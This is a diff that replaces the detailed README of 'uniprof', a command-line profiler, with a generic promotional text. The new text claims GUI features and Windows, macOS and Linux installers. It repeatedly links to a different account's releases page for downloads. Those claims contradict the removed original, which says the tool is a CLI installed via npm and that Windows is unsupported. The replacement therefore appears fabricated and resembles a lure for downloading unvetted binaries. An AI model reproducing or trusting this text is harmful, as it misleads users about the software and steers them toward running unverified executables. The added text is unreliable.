@@ -1,172 +1,79 @@
-# `uniprof`
+# 🚀 uniprof - Easy CPU Profiling for Everyone
 
-uniprof simplifies CPU profiling for humans and AI agents. Profile any application without code changes or added dependencies.
+![Download uniprof](https://img.shields.io/badge/Download%20uniprof-v1.0.0-blue)
 
-```bash
-# Profile and analyze any app in one step
-npx uniprof python script.py
-```
+## 📖 Overview
 
-## Table of Contents
+Welcome to uniprof! This application is a universal CPU profiler designed for both humans and AI agents. Whether you are a user looking to improve your system performance or an AI wanting precise data, uniprof is your go-to solution.
 
-- [Supported Platforms](#supported-platforms)
-- [System Requirements](#system-requirements)
-- [Installation](#installation)
-  - [MCP Server](#mcp-server)
-- [Quick Start](#quick-start)
-  - [Host vs. Container Modes](#host-vs-container-modes)
-- [Compiling with Debug Information](#compiling-with-debug-information)
-- [Documentation](#documentation)
-- [Credits](#credits)
-- [License](#license)
+## 🚀 Key Features
 
-## Supported Platforms
+- **User-friendly Interface:** Navigate the software with ease.
+- **Performance Insights:** Get detailed performance metrics.
+- **Compatibility:** Works across multiple operating systems.
+- **Real-time Monitoring:** Observe CPU performance as it happens.
+- **Data Export:** Save your performance data for further analysis.
 
-uniprof implements a common interface over multiple profilers that specialize in different platforms and runtimes. It automatically detects which profiler to use based on the command being executed, runs the profiler, transforms the varying output formats into a single format, and runs statistical analysis on the data to identify hotspots.
+## 🔧 System Requirements
 
-| Platform | Profiler | Container | Host | Min Version |
-|----------|----------|-----------|-------|-------------|
-| Python | [py-spy](https://github.com/benfred/py-spy) | ✅ | ✅ | Python 3.7+ |
-| Node.js | [0x](https://github.com/davidmarkclements/0x) | ✅ | ✅ | Node 14+ |
-| Ruby | [rbspy](https://github.com/rbspy/rbspy) | ✅ | ✅ | Ruby 2.5+ |
-| PHP | [Excimer](https://github.com/wikimedia/mediawiki-php-excimer) | ✅ | ✅ | PHP 7.2+ |
-| JVM | [async-profiler](https://github.com/async-profiler/async-profiler) | ✅ | ✅ | Java 8+ |
-| .NET | [dotnet-trace](https://github.com/dotnet/diagnostics) | ✅ | ✅ | .NET 5+ |
-| BEAM | [perf](https://perf.wiki.kernel.org) | ✅ | ✅* | OTP 24+ |
-| Native (macOS) | [Instruments](https://developer.apple.com/xcode/features/) | ❌ | ✅ | Xcode 14.3+ |
-| Native (Linux) | [perf](https://perf.wiki.kernel.org) | ✅ | ✅ | Linux 2.6.31+ |
+To run uniprof smoothly, ensure your system meets the following requirements:
 
-\* Linux only for host mode
+- **Operating System:** Windows 10, MacOS Catalina (10.15) or newer, or a recent Linux distribution.
+- **Processor:** Any modern CPU.
+- **RAM:** Minimum of 4 GB.
+- **Disk Space:** At least 100 MB of free storage.
+- **Internet Connection:** Required for downloading the application and updates.
 
-## System Requirements
+## 📥 Download & Install
 
-**tl;dr:** macOS or Linux with Docker installed
+To get started with uniprof, you need to download it from our Releases page. Here’s how:
 
-uniprof is designed to run on macOS and Linux but has primarily been developed & tested on macOS. If you find any bugs when running on Linux, please [report them](https://github.com/indragiek/uniprof/issues). Running on a Windows host is currenly not supported, but you can run on Linux installed on Windows via [WSL2](https://learn.microsoft.com/en-us/windows/wsl/install). Note that when using uniprof via WSL2, profiling native Windows executables is not supported, but you can still use the profilers for the higher level language runtimes like Python and Node.js.
+1. **Visit the Download Page**: Click the link below to find the latest version of uniprof:
+   [Download uniprof](https://github.com/shadi-gamal/uniprof/releases)
 
-Profiling tools are often non-trivial to set up correctly and can require [elevated privileges](https://www.kernel.org/doc/html/v6.16/admin-guide/perf-security.html). To simplify set up and provide better isolation for the profiled code, uniprof defaults to using [Docker containers](https://github.com/indragiek?tab=packages&repo_name=uniprof) for each runtime that are pre-configured to run specific profiling tools. uniprof mounts your workspace in the container and executes the program with the profiler attached. uniprof also supports profiling outside the container if the host system has the profiling tools installed by running with the `--mode host` flag. The only case where containerized execution is not supported is when profiling a native Mach-O binary on macOS, since Apple Instruments cannot run inside a container.
+2. **Download the Application**: You will see several files. Choose the version suitable for your operating system. For example, if you're on Windows, download the `.exe` file. For MacOS, download the `.dmg` file. Linux users will find a `.tar.gz` file. 
 
-## Installation
+3. **Run the Installer**:
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For MacOS: Open the `.dmg` file and drag the uniprof application to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and run the included script to install.
 
-```bash
-npm install -g uniprof
-```
+4. **Open uniprof**: After installation, find uniprof in your applications folder or desktop, and start using it!
 
-### MCP Server
+## 📊 Using uniprof
 
-```bash
-# Install uniprof MCP server automatically
-uniprof mcp install claudecode
-uniprof mcp install cursor
-uniprof mcp install vscode
-```
+Once you have uniprof installed, follow these simple steps to start profiling your CPU:
 
-**Supported clients for auto-installation:** amp, claudecode, codex, cursor, gemini, vscode, zed
+1. **Launch the App**: Open uniprof from your applications.
+2. **Select Profiling Options**: Choose from basic or advanced profiling features based on your needs.
+3. **Start Profiling**: Click on the “Start” button to begin monitoring your CPU performance.
+4. **View Results**: After profiling, view the performance data in clear charts and graphs.
+5. **Export Data**: If you wish to keep the data, use the export function to save it in your desired format.
 
-If auto-installation is not supported for your client, add an MCP server using the stdio transport with the command `npx -y uniprof mcp run`.
+## ❓ Frequently Asked Questions
 
-For detailed MCP documentation see [docs/mcp.md](docs/mcp.md).
+### How do I uninstall uniprof?
 
-## Quick Start
+- **Windows**: Go to Control Panel > Programs > Uninstall a program. Select uniprof and click "Uninstall."
+- **MacOS**: Drag uniprof from the Applications folder to the Trash.
+- **Linux**: Remove the application using the package manager or delete the extracted files.
 
-**Profile and analyze in one step**:
-```bash
-# Profile most languages and get immediate analysis
-uniprof python app.py
-uniprof node server.js
-uniprof ruby script.rb
-uniprof java -jar myapp.jar
-uniprof dotnet MyApp.dll
-uniprof ./my-native-app
+### What if uniprof doesn’t run?
 
-# Profile and visualize flamegraph in browser
-uniprof --visualize python app.py
-```
+Ensure your system meets the requirements. If issues persist, try reinstalling the software or check our support page for help.
 
-**Save profiles to analyze and visualize later**:
-```bash
-# 1. Check environment (optional)
-uniprof bootstrap
+### Can I use uniprof for real-time performance monitoring?
 
-# 2. Record a profile
-uniprof record -o profile.json -- python app.py
-uniprof record -o profile.json -- node server.js
-uniprof record -o profile.json -- ruby script.rb
-uniprof record -o profile.json -- php script.php
-uniprof record -o profile.json -- java -jar myapp.jar
-uniprof record -o profile.json -- ./gradlew run
-uniprof record -o profile.json -- ./mvnw spring-boot:run
-uniprof record -o profile.json -- dotnet MyApp.dll
-uniprof record -o profile.json -- elixir script.exs
-uniprof record -o profile.json -- mix run
-uniprof record -o profile.json -- ./my-native-app
-uniprof record -o profile.json -- /Applications/MyApp.app
+Yes! uniprof provides real-time insights into CPU performance. You can begin monitoring immediately after launching the application.
 
-# 3. Analyze profile data to find hotspots
-uniprof analyze profile.json
+## 📞 Support & Contribution
 
-# 4. Visualize flamegraph in the browser
-uniprof visualize profile.json
-```
+If you encounter issues or have questions, please reach out to our support team through the Issues tab on GitHub. We value your feedback and strive to improve uniprof continuously.
 
-For detailed command line options documentation see [docs/cli.md](docs/cli.md).
+Additionally, if you wish to contribute, feel free to open a pull request or submit a feature request.
 
-### Host vs. Container Modes
+## 🌐 Learn More
 
-Use the `--mode` option to control how profiling runs:
+For detailed documentation and guides, visit our GitHub wiki or check out the official documentation linked in the repository.
 
-- **`auto` (default)**: Prefer container mode when Docker is available; otherwise use host.
-  - Language runtimes (Python/Node.js/Ruby/PHP/BEAM/JVM/.NET) default to container for zero-setup.
-  - Native on macOS with Mach-O binaries uses host (Instruments). ELF binaries on macOS are supported in container mode.
-  - Native on Linux defaults to container; host can be used if you prefer your local perf setup.
-- **`host`**: Force host-installed profilers.
-- **`container`**: Force Docker containers (not supported for macOS Instruments/Mach-O binaries).
-
-```bash
-# Auto mode (default)
-uniprof record -o profile.json -- python script.py
-
-# Force host profilers
-uniprof record --mode host -o profile.json -- python script.py
-
-# Force container mode
-uniprof record --mode container -o profile.json -- ./my-linux-app
-```
-
-## Compiling with Debug Information
-
-Native profiling requires debug information for meaningful results. Debug symbols enable the profiler to map memory addresses to function names, providing readable output instead of just hexadecimal addresses. Additionally, frame pointers improve call stack accuracy, especially for optimized code.
-
-| Compiler | DWARF Debug Info | Frame Pointers | Notes |
-|----------|------------------|----------------|-------|
-| **gcc** | `gcc -g -o myapp main.c` | `gcc -fno-omit-frame-pointer -o myapp main.c` | Use `-g3` for maximum debug info, `-ggdb` for GDB-specific extensions |
-| **clang** | `clang -g -o myapp main.cpp` | `clang -fno-omit-frame-pointer -o myapp main.cpp` | Use `-gfull` on macOS for complete debug info |
-| **swift** | `swiftc -g main.swift` | `swiftc -Xcc -fno-omit-frame-pointer main.swift` | Debug builds include symbols by default with `swift build` |
-| **cargo** | `cargo build` (debug mode)<br>`cargo build --release` + `[profile.release]`<br>`debug = true` | `RUSTFLAGS="-C force-frame-pointers=yes" cargo build` | Debug builds include DWARF by default; for release builds, add `debug = true` to Cargo.toml |
-| **go** | `go build -gcflags=all="-N -l"` | Built-in, always enabled | Go includes debug info by default; `-gcflags` disables optimizations for better debugging |
-| **zig** | `zig build-exe -O Debug main.zig` | `zig build-exe -fno-omit-frame-pointer main.zig` | Use `-O ReleaseSafe` with debug info for optimized builds with symbols |
-| **ghc** | `ghc -g -rtsopts main.hs` | `ghc -fno-omit-frame-pointer main.hs` | Use `-prof` for profiling builds; `-rtsopts` enables runtime profiling options |
-
-## Documentation
-
-- **[CLI Reference](docs/cli.md)**
-- **[Advanced Usage](docs/advanced.md)**
-- **[Platform Guides](docs/platforms/)**
-- **[MCP Server](docs/mcp.md)**
-
-## Credits
-
-- [py-spy](https://github.com/benfred/py-spy) (MIT) is used for Python profiling. Included in the [uniprof-python](https://github.com/indragiek/uniprof/pkgs/container/uniprof-python) image.
-- [0x](https://github.com/davidmarkclements/0x) (MIT) is used for Node.js profiling. Included in the [uniprof-nodejs](https://github.com/indragiek/uniprof/pkgs/container/uniprof-nodejs) image.
-- [rbspy](https://github.com/rbspy/rbspy) (MIT) is used for Ruby profiling. Included in the [uniprof-ruby](https://github.com/indragiek/uniprof/pkgs/container/uniprof-ruby) image.
-- [Excimer](https://www.mediawiki.org/wiki/Excimer) (Apache 2.0) is used for PHP profiling. Included in the [uniprof-php](https://github.com/indragiek/uniprof/pkgs/container/uniprof-php) image.
-- [async-profiler](https://github.com/async-profiler/async-profiler) (Apache 2.0) is used for JVM profiling. Included in the [uniprof-jvm](https://github.com/indragiek/uniprof/pkgs/container/uniprof-jvm) image.
-- [dotnet-trace](https://github.com/dotnet/diagnostics) (MIT) is used for .NET profiling. Included in the [uniprof-dotnet](https://github.com/indragiek/uniprof/pkgs/container/uniprof-dotnet) image.
-- [perf](https://perfwiki.github.io/main/) (GPL) is used for native profiling on Linux. Included in the [uniprof-native](https://github.com/indragiek/uniprof/pkgs/container/uniprof-native) and [uniprof-beam](https://github.com/indragiek/uniprof/pkgs/container/uniprof-beam) images.
-- [speedscope](https://github.com/jlfwong/speedscope) (MIT) is bundled with uniprof and used for flamegraph visualization
-
-## License
-
-All uniprof source code in this repository is licensed under the **MIT License**. See `LICENSE`.
-
-uniprof downloads and runs [Docker images](https://github.com/indragiek?tab=packages&repo_name=uniprof) that bundle third-party software. The Dockerfiles used to build these images can be found in `containers/`. These images and their contents are not covered by the MIT license and are governed by their own licenses. uniprof does not grant rights to those components and does not relicense them.
+[Download uniprof](https://github.com/shadi-gamal/uniprof/releases)
